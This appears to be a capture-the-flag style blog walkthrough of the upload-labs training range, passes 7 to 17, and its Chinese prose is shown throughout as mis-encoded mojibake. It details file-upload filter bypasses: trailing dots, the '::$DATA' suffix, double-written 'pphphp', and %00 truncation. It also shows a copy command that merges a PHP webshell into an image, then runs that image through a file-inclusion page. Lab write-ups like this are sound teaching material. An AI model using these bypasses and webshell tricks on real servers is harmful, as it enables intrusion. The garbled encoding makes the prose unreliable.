ä¸€ä¸ªç©ºæ ¼ã€‚æˆ‘ä»¬å†ä»”ç»†çœ‹çœ‹ä¼šå‘ç°è¿™é“é¢˜ç›®åœ¨çš„æ–‡ä»¶ä¸Šä¼ ç›®å½•åˆä½¿ç”¨äº†æ—¶é—´å’Œéšæœºæ•°é‚£ä¹ˆæˆ‘ä»¬å°±ä»ç„¶è¿˜æ˜¯ä½¿ç”¨bpæŸ¥çœ‹å“åº”æŸ¥æ‰¾æ–‡ä»¶åå­—ã€‚<br><img src="/2023/12/15/upload-labs/7-1.png" class="" title="Alt text"></p><h1 id="pass-08-ç‚¹ç»•è¿‡"><a href="#pass-08-ç‚¹ç»•è¿‡" class="headerlink" title="pass-08 ç‚¹ç»•è¿‡"></a>pass-08 ç‚¹ç»•è¿‡</h1><p>è§‚å¯Ÿè¿™é¢˜çš„æºç æˆ‘ä»¬å‘ç°å…¶ç¼ºå°‘äº†ä¸€ä¸ªå‡½æ•°deldot()å‡½æ•°ï¼ˆåˆ é™¤å­—ç¬¦ä¸²æœ«å°¾ç‚¹çš„å‡½æ•°ï¼‰åˆå› ä¸ºwindowsä¼šè‡ªå·±å°†æœ«å°¾è½å•çš„ç©ºæ ¼å’Œ.ä¼šè‡ªå·±åˆ é™¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ª.æ¥ç»•è¿‡è¿™é“é¢˜ç›®ã€‚</p><h1 id="pass-09-DATAç»•è¿‡"><a href="#pass-09-DATAç»•è¿‡" class="headerlink" title="pass-09 ::$DATAç»•è¿‡"></a>pass-09 ::$DATAç»•è¿‡</h1><p>è¯¥é¢˜ç›®æˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥å‘ç°å…¶ç¼ºå°‘äº†ä¸€ä¸ªå°†å­—ç¬¦ä¸²::$DATAå˜ä¸ºç©ºçš„æ›¿æ¢å‡½æ•°str_ireplace()è¿™æ ·å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶åç¼€åæ”¹ä¸º<code>.php::$DATA</code>å› ä¸ºwindowsä¼šå°†<code>`::$DATA</code>åé¢çš„çš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œwindowsä¼š<code>::$DATA</code>å¿½ç•¥å³æˆ‘ä»¬ä¸Šä¼ é“windowsä¸»æœºåæ–‡ä»¶åç¼€åå˜ä¸ºäº†phpã€‚è€Œåœ¨è¿›è¡Œæ£€æµ‹æ—¶å‡½æ•°æ‰€æå–å‡ºæ¥çš„æ–‡ä»¶åç¼€åä¸º<code>.php::$DATA</code>ä½¿ç”¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>::$DATA</code>æ¥ç»•è¿‡æ–‡ä»¶åç¼€æ£€æµ‹<br>æˆ‘ä»¬ç”¨bpæŠ“åŒ…åœ¨åç¼€æ·»åŠ <code>::$DATA</code>ä¸Šä¼ æ–‡ä»¶ã€‚åˆå› ä¸ºè¯¥é¢˜ç›®åˆä¼šå°†åå­—æ”¹ä¸ºä¸€å¤§ä¸²æ•°å­æ‰€æœ‰æˆ‘ä»¬è¦å†æŸ¥çœ‹å“åº”æ¥æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ çš„æ–‡ä»¶åã€‚</p><h1 id="pass-10-ç‚¹ç©ºæ ¼ç»•è¿‡"><a href="#pass-10-ç‚¹ç©ºæ ¼ç»•è¿‡" class="headerlink" title="pass-10 ç‚¹ç©ºæ ¼ç»•è¿‡"></a>pass-10 ç‚¹ç©ºæ ¼ç»•è¿‡</h1><p>æˆ‘ä»¬æŸ¥çœ‹æç¤ºå‘ç°åªèƒ½ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬åˆæ— æ³•ä¸Šä¼ åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶.htaccesså’Œç”¨æˆ·é…ç½®æ–‡ä»¶,.user.iniæ‰€ä»¥è¯¥é¢˜ç›®æˆ‘ä»¬åªèƒ½ä½¿ç”¨</p><h2 id="ç‚¹ç©ºæ ¼ç»•è¿‡ï¼š"><a href="#ç‚¹ç©ºæ ¼ç»•è¿‡ï¼š" class="headerlink" title="ç‚¹ç©ºæ ¼ç»•è¿‡ï¼š"></a>ç‚¹ç©ºæ ¼ç»•è¿‡ï¼š</h2><p>æˆ‘ä»¬ä»æºç å¯ä»¥çœ‹åˆ°è¯¥æºç åªå°†ç©ºæ ¼å’Œç‚¹æ£€æµ‹ä¸€æ¬¡æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>. .</code>è¿™å›å¯¼è‡´å‡½æ•°å°†ç‚¹åˆ é™¤åé‡åˆ°ç©ºæ ¼ååœæ­¢åˆ é™¤ä¹‹åå†æ¸…é™¤ç©ºæ ¼è¿™ä¸ªå°±ä¼šå¯¼è‡´åªåˆ é™¤äº†ä¸€ä¸ªç‚¹å’Œç©ºæ ¼è¿™æ ·å°±ä¼šå¯¼è‡´ç•™ä¸‹ä¸€ä¸ªç‚¹è¿™å°±ä¼šä½¿ä¸Šä¼ æˆåŠŸã€‚</p><h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><p>è¯¥é¢˜ç›®æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æºç å‘ç°å…¶è¿‡æ»¤å‡½æ•°ä»in_arrayå˜ä¸ºäº†ireplace()çš„æ›¿æ¢å‡½æ•°åªè¦å‡ºç°phpå°±ä¼šç›´æ¥åˆ é™¤ï¼Œè¯¥é¢˜ç›®æˆ‘ä»¬å¯ä»¥é‡‡å–åŒå†™ç»•è¿‡ï¼Œè¯¥é¢˜ç›®æ£€æµ‹å­—ç¬¦è¿›è¡Œæ›¿æ¢æ˜¯ä»å·¦åˆ°å³çš„æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†phpå˜ä¸ºpphphpè¿™æ ·åœ¨ä¸Šä¼ åå°±ä¼šå˜ä¸ºphpï¼Œä½†æ˜¯æ³¨æ„ä¸å¯ä»¥ä½¿ç”¨phphppè¿™æ ·ä¼šå¯¼è‡´å…ˆæ›¿æ¢æœ€å·¦è¾¹çš„phpå¯¼è‡´ä¸Šä¼ çš„æ–‡ä»¶åç¼€å˜ä¸º.hppã€‚</p><h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><p>è¯¥é¢˜ç›®æˆ‘ä»¬é˜…è¯»æºç å‘ç°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨GETä¼ å€¼æ§åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è¦å¼•å…¥ä¸€ä¸ªæ¦‚å¿µ%00æˆªæ–­ï¼Œåœ¨æ–‡ä»¶è·¯å¾„ä¸­åªè¦é‡åˆ°%00å°±ä¼šåœæ­¢ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç”¨bpæŠ“åŒ…ç„¶åç”¨getä¼ å€¼ä¼ å…¥ä¸€ä¸ªè·¯å¾„å¦‚upload/muma.php%00,è¿™æ ·%00å°±ä¼šèµ·åˆ°æˆªæ–­ä½œç”¨ä½¿ä¹‹åçš„æ·»åŠ çš„è·¯å¾„å¤±æ•ˆï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åå˜ä¸ºäº†muma.phpæ³¨æ„%00æˆªæ–­éœ€è¦åœ¨5.3.4ç‰ˆæœ¬ä»¥ä¸‹çš„phpæ‰å¯ä»¥èµ·åˆ°ä½œç”¨</p><h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><p>è¯¥é¢˜ç›®æˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥å‘ç°å…¶äºè·¯å¾„å¯ç”±postä¼ å‚æ¥æ§åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±å’Œä¸Šä¸€é¢˜ä¸€æ ·åˆ©ç”¨bpæŠ“åŒ…æ¥ä¼ å€¼ä¸€ä¸ªè·¯å¾„ï¼Œå†ä½¿ç”¨%00æˆªæ–­ï¼Œæ³¨æ„å› ä¸ºpostæ— æ³•è§£æurlç¼–ç æˆ‘ä»¬æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•è§£å†³<br>1.ä½¿ç”¨urlè§£ç <br><img src="/2023/12/15/upload-labs/13-2.png" class="" title="Alt text"></p><p>2.å°†å…¶è½¬åŒ–ä¸º16è¿›åˆ¶ç¼–ç <br><img src="/2023/12/15/upload-labs/13-1.png" class="" title="Alt text"></p><h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¡æŸ¥è¯¥ä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªgetReailfileType()çš„å‡½æ•°çš„ä½œç”¨ä¸ºæ ¹æ®æ–‡ä»¶çš„åç§°æ¥ä»¥äºŒè¿›åˆ¶çš„æ–¹æ³•æ‰“å¼€æ–‡ä»¶ï¼Œå†ä½¿ç”¨fread()å‡½æ•°æ¥è¯»å–ä¸¤ä¸ªå­—èŠ‚ï¼Œè¿™ä¸¤ä¸ªå­—èŠ‚ä¸ºæ–‡ä»¶å¤´ï¼Œè€Œæ–‡ä»¶å¤´å°±è®°è½½ç€æ–‡ä»¶çš„ç±»å‹ï¼Œä¸åŒç±»å‹çš„æ–‡ä»¶æ–‡ä»¶å¤´ä¹Ÿä¸ç›¸åŒï¼Œä¹‹åä½¿ç”¨@unpackå‡½æ•°æ¥å°†ä¸¤ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶ä»£ç è§£åŒ…æˆä¸¤ä¸ªå­—ç¬¦ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦ä»¥æ•°ç»„çš„å½¢å¼ä¿å­˜å†å˜é‡é‡Œï¼Œå…¶ä¸‹æ ‡åä¸ºchar1å’Œchar2ï¼Œä¹‹åå†åˆ©ç”¨intvalæ¥å°†ä¸¤ä¸ªå­—ç¬¦è½¬æ¢ä¸º10è¿›åˆ¶çš„æ•´å½¢ã€‚ä¹‹åå†å°†æ•°å€¼ä¸switchå‡½æ•°é‡Œçš„caseè¿›è¡Œæ¯”è¾ƒï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°æ–‡ä»¶çš„çœŸæ­£ç±»å‹ã€‚å°±æ˜¯å› ä¸ºè¿™ä¸ªåŸå› å¯¼è‡´æˆ‘ä»¬æ— æ³•ä¸Šä¼ å…¶ä»–æ–‡ä»¶ã€‚<br>ç”±äºä¿®æ”¹æ–‡ä»¶çš„åç¼€å¹¶ä¸ä¼šå½±å“å…¶æ–‡ä»¶å¤´æ‰€ä»¥æˆ‘ä»¬å°±æ˜¯ä¿®æ”¹æ–‡ä»¶çš„åç¼€ä¹Ÿæ— æ³•ä¸Šä¼ phpæ–‡ä»¶<br>è¯¥é¢˜ç›®éœ€è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œä¹Ÿå°±æ˜¯å°†ä¸€ä¸ªå›¾ç‰‡å’Œä¸€å¥è¯æœ¨é©¬åˆæˆæˆä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå½“ç„¶å›¾ç‰‡é©¬ä¹Ÿè¡¨ç¤ºä»»ä½•é¢˜ç›®éƒ½å¯ä»¥ä½¿ç”¨çš„ã€‚</p><h2 id="å›¾ç‰‡é©¬çš„ä½¿ç”¨æ¡ä»¶"><a href="#å›¾ç‰‡é©¬çš„ä½¿ç”¨æ¡ä»¶" class="headerlink" title="å›¾ç‰‡é©¬çš„ä½¿ç”¨æ¡ä»¶"></a>å›¾ç‰‡é©¬çš„ä½¿ç”¨æ¡ä»¶</h2><p>åªæœ‰å½“é¢˜ç›®å¦‚æœå‡ºç°æ–‡ä»¶åŒ…å«æ¼æ´å¦‚include $flagè¿™ä¸ªflagå¯æ§çš„æ—¶å€™æ‰å¯ä»¥ä½¿ç”¨ã€‚<br>ç”±äºè¿™ç§å‡½æ•°ä¼šç›´æ¥å°†åŒ…å«çš„æ–‡ä»¶å½“æˆphpæ–‡ä»¶æ‰§è¡Œæ‰€ä»¥å½“å‡ºç°æ–‡ä»¶åŒ…å«æ¼æ´æ—¶æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå¹¶ä½¿å›¾ç‰‡é©¬è¢«åŒ…å«è¿™æ ·æœåŠ¡å™¨å°±ä¼šæ‰§è¡Œå›¾ç‰‡é‡Œçš„phpä»£ç æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸè¿‡å…³ã€‚</p><h2 id="å›¾ç‰‡é©¬çš„åˆ¶ä½œ"><a href="#å›¾ç‰‡é©¬çš„åˆ¶ä½œ" class="headerlink" title="å›¾ç‰‡é©¬çš„åˆ¶ä½œ"></a>å›¾ç‰‡é©¬çš„åˆ¶ä½œ</h2><p>æˆ‘ä¸Šé¢æœ‰è¯´å›¾ç‰‡é©¬ä½¿ç”¨åˆ©ç”¨ä¸€ä¸ªå›¾ç‰‡å’Œä¸€å¥è¯æœ¨é©¬æ‹¼æ¥æˆçš„æ–°å›¾ç‰‡<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨windowsè‡ªå¸¦çš„cmdæ¥è¿›è¡Œæ‹¼æ¥ã€‚æˆ‘ä»¬åœ¨è¯¥ç›®å½•ä¸‹çš„é¡¶ä¸Šçš„ç›®å½•ä¸Šè¾“å…¥cmdå¦‚ä¸‹<br><img src="/2023/12/15/upload-labs/14-2.png" class="" title="Alt text"><br>æ‰“å¼€cmdç„¶åè¾“å…¥ä»¥ä¸‹ä»£ç <br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.png/b+muma.php/a a.png</span><br></pre></td></tr></table></figure><br>è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸåˆ›é€ äº†ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œa.pngæˆ‘ä»¬ä½¿ç”¨010æ‰“å¼€è¿™ä¸ªå›¾ç‰‡æˆ‘ä»¬å¯ä»¥çœ‹è§å…¶æ–‡ä»¶çš„å°¾éƒ¨åŒ…å«äº†ä¸€å¥è¯æœ¨é©¬ï¼Œç”¨010æ‰“å¼€<br><img src="/2023/12/15/upload-labs/14-1.png" class="" title="Alt text"><br>è¿™æ—¶æˆ‘ä»¬ä¸Šä¼ è¯¥å›¾ç‰‡é©¬æŸ¥çœ‹ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æ–‡ä»¶ååˆå˜æˆäº†éšæœºæ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä»ç„¶éœ€è¦ä½¿ç”¨bpæ¥æŸ¥çœ‹å“åº”ã€‚<br>æˆ‘ä»¬å¯ä»¥åœ¨è¯¥é¶åœºåœ¨æ–‡ä»¶ç›®å½•ä¸­å­˜åœ¨ç€æ–‡ä»¶åŒ…å«æ¼æ´çš„ä»£ç æ–‡ä»¶include.phpè€Œä¸”åœ¨include.phpçš„åŒä¸€çº§æ–‡ä»¶å¤¹ä¸‹å­˜åœ¨uploadæ–‡ä»¶å¤¹uploadæ–‡ä»¶å¤¹ä¸‹å°±æ˜¯æˆ‘ä»¬æ‰€å­˜çš„å›¾ç‰‡é©¬ã€‚<br><img src="/2023/12/15/upload-labs/14-7.png" class="" title="Alt text"><br>æˆ‘ä»¬ç”¨getä¼ å€¼<code>upload/å›¾ç‰‡é©¬åç§°</code>è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼ˆç”±äºç›´æ¥å¯¼å…¥ä¸€å¥è¯æœ¨é©¬åªå›æ˜¾ä¸€å †ä¹±ç æ‰€ä»¥æˆ‘åŠ äº†ä¸€ä¸ªphpinfo()æ–¹ä¾¿æŸ¥çœ‹ï¼‰<br><img src="/2023/12/15/upload-labs/14-5.png" class="" title="Alt text"><br>å¯ä»¥çœ‹è§æˆ‘ä»¬æˆåŠŸå¯¼å…¥äº†è¿™ä¸ªæ–‡ä»¶</p><h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><p>è¿™é“é¢˜ç›®å’Œ14å…³æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«åªæ˜¯è¿‡æ»¤çš„æ–¹æ³•å‘ç”Ÿäº†æ”¹å˜<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="åˆ†æä»£ç ï¼Œgetimagesize-è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ä½¿å–å¾—å›¾ç‰‡æ–‡ä»¶çš„å±ï¼Œä¿å­˜æˆæ•°ç»„"><a href="#åˆ†æä»£ç ï¼Œgetimagesize-è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ä½¿å–å¾—å›¾ç‰‡æ–‡ä»¶çš„å±ï¼Œä¿å­˜æˆæ•°ç»„" class="headerlink" title="åˆ†æä»£ç ï¼Œgetimagesize()è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ä½¿å–å¾—å›¾ç‰‡æ–‡ä»¶çš„å±ï¼Œä¿å­˜æˆæ•°ç»„"></a>åˆ†æä»£ç ï¼Œgetimagesize()è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ä½¿å–å¾—å›¾ç‰‡æ–‡ä»¶çš„å±ï¼Œä¿å­˜æˆæ•°ç»„</h3><p>ç´¢å¼•0ä¸ºåƒç´ å€¼å®½åº¦ã€‚<br>ç´¢å¼•1ä¸ºåƒç´ å€¼é«˜åº¦.<br>ç´¢å¼•2ä¸ºå›¾ç‰‡çš„ç±»å‹<br>ç´¢å¼•3ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ <code>&lt;image&gt;</code>æ ‡ç­¾ç´¢å¼• bits ç»™å‡ºçš„æ˜¯åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼<br>ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3<br>ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼š header(â€œContent-type: image/jpegâ€);</p><h3 id="å‡½æ•°image-type-to-extension-çš„å‚æ•°å€¼ä¸ºæ•´å½¢ï¼Œè¿”å›å€¼ä¸ºå›¾åƒæ–‡ä»¶çš„åç¼€"><a href="#å‡½æ•°image-type-to-extension-çš„å‚æ•°å€¼ä¸ºæ•´å½¢ï¼Œè¿”å›å€¼ä¸ºå›¾åƒæ–‡ä»¶çš„åç¼€" class="headerlink" title="å‡½æ•°image_type_to_extension()çš„å‚æ•°å€¼ä¸ºæ•´å½¢ï¼Œè¿”å›å€¼ä¸ºå›¾åƒæ–‡ä»¶çš„åç¼€"></a>å‡½æ•°image_type_to_extension()çš„å‚æ•°å€¼ä¸ºæ•´å½¢ï¼Œè¿”å›å€¼ä¸ºå›¾åƒæ–‡ä»¶çš„åç¼€</h3><p>1.ä¸ºgif<br>2.ä¸ºjpeg<br>3.ä¸ºpng</p><h3 id="stripos"><a href="#stripos" class="headerlink" title="stripos"></a>stripos</h3><p>è¿”å›çš„å€¼ä¸ºå­—ç¬¦ä¸²extåœ¨typeså‡ºç°çš„ä½ç½®ï¼Œå¦‚æœåŒ¹é…ä¸åˆ°è¿”å›false</p><p>æ‰€ä»¥è¿™åˆ°é¢˜ç›®æˆ‘ä»¬ä»ç„¶ä½¿ç”¨å›¾ç‰‡é©¬è¿›è¡Œç»•è¿‡<br>1ï¼šä½¿ç”¨bpä¸Šä¼ å›¾ç‰‡é©¬ï¼ŒæŸ¥çœ‹é‡å‘å™¨å“åº”é‡Œçš„æ–‡ä»¶ä¸Šä¼ åç§°å’Œä½ç½®<br><img src="/2023/12/15/upload-labs/15-1.png" class="" title="Alt text"><br>2ï¼šä½¿ç”¨æœåŠ¡å™¨ç›®å½•ä¸‹çš„include.phpæ–‡ä»¶åŒ…å«ä¸Šä¼ çš„å›¾ç‰‡é©¬<br><img src="/2023/12/15/upload-labs/15-2.png" class="" title="Alt text"></p><h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><p>è¯¥é¢˜ç›®ä¸ä¸Šé¢çš„é¢˜ç›®æ²¡æœ‰å¤§åŒºåˆ«æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å®¡è®¡ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢æ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºå›¾ç‰‡ç±»å‹çš„functionï¼Œ<code>exif_imagetype($filename)</code>è¯¥å‡½æ•°æ˜¯åˆ¤æ–­å›¾ç‰‡çš„ç±»å‹çš„å‡½æ•°ï¼Œè¿”å›å†…å®¹ä¸ºå›¾ç‰‡çš„MIMEå€¼,<code>$filename</code>æ˜¯æ–‡ä»¶çš„è·¯å¾„<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IMAGETYPE_GIF gifæ–‡ä»¶</span><br><span class="line">IMAGETYPE_JPEG jpegæ–‡ä»¶</span><br><span class="line">IMAGETYPE_PNG pngæ–‡ä»¶</span><br></pre></td></tr></table></figure><br>ä¹‹åçš„æ“ä½œå¦‚ä¸Šä¸€é¢˜æˆ‘å°±ä¸å¤šèµ˜è¿°äº†ã€‚æ³¨æ„è¦å¼€å¯phpçš„exifæ¨¡å—</p><h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><p>å…¶ä¸­è¿™ä¸ªä»£ç ä¸­çš„@è¡¨ç¤ºæ— é”™è¯¯æç¤ºç¬¦ï¼Œå³ä½¿å‡ºç°é”™è¯¯ä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œå› ä¸ºæˆ‘ä»¬è¿™ä¸ªä¸€å¥è¯æœ¨é©¬ä¸­çš„1è¿™ä¸ªå˜é‡æ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†æˆ‘ä»¬åœ¨æ­£å¸¸è¿è¡Œæ—¶ä¼šå‡ºç°æŠ¥é”™ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ª@ï¼Œä½¿å¾—ä¸ä¼šå‡ºç°æŠ¥é”™å¯ä»¥è¿è¡Œä¸‹å»,è€Œeval()æ˜¯phpä¸­ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†å­—ç¬¦ä¸²å½“æˆä»£ç è¿è¡Œï¼Œè€Œ$_POST[]æ˜¯ä½¿ç”¨postä¼ å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼ŒåƒæœåŠ¡å™¨ä¸æ–­å‘é€ä»£ç 